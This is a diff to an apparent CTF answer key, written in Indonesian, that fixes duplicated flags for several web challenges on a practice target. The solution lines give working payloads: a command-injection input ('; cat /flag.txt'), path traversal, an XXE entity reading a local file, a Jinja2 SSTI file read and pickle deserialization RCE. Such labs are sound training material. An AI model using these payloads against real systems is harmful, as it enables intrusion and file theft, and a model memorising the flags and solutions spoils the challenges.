@@ -83,12 +83,12 @@
 [07] File Viewer Pro / LFI (Medium - 250 Pts)
 - Target: https://target.paradick.my.id/lfi/
 - Solusi: Lakukan Path Traversal dengan mengganti parameter `?page=flag.txt`.
-- Flag: CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}
+- Flag: CTF{lfi_path_tr4v3rs4l_m4st3r_2026}
 
 [08] Ping Diagnostic Utility / RCE (Medium - 300 Pts)
 - Target: https://target.paradick.my.id/rce_ping/
 - Solusi: Input IP `127.0.0.1; cat /flag.txt`.
-- Flag: CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}
+- Flag: CTF{rce_c0mm4nd_1nj3ct10n_m4st3r_2026}
 
 [09] Business Logic Shop (Medium - 350 Pts)
 - Target: https://target.paradick.my.id/logic_shop/
@@ -108,17 +108,17 @@
 [12] XXE XML Parser (Hard - 450 Pts)
 - Target: https://target.paradick.my.id/xxe_lab/
 - Solusi: Kirim XML payload `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data>&xxe;</data>`.
-- Flag: CTF{34sy_sql_1nj3ct10n_byp4ss_2026}
+- Flag: CTF{xxe_xml_3x73rn4l_3n717y_2026}
 
 [13] CyberVault Report Generator / SSTI (Hard - 500 Pts)
 - Target: https://target.paradick.my.id/ssti/
 - Solusi: Inject Jinja2 payload `{{ self.__init__.__globals__.__builtins__.open('/flag.txt').read() }}`.
-- Flag: CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}
+- Flag: CTF{ssti_j1nj42_w4f_byp4ss_2026}
 
 [14] Pickle Deserialization Vault (Hard - 500 Pts)
 - Target: https://target.paradick.my.id/pickle_rce/
 - Solusi: Set cookie `pickle_session` dengan Base64 objek Python Pickle `__reduce__` RCE.
-- Flag: CTF{s3rv3r_s1d3_t3mpl4t3_1nj3ct10n_m4st3r_2026}
+- Flag: CTF{p1ckl3_d3s3r14l1z4710n_rce_2026}
 
 [15] Exposed .git Directory Leak (Medium - 150 Pts)
 - Target: https://target.paradick.my.id/hidden_comment/
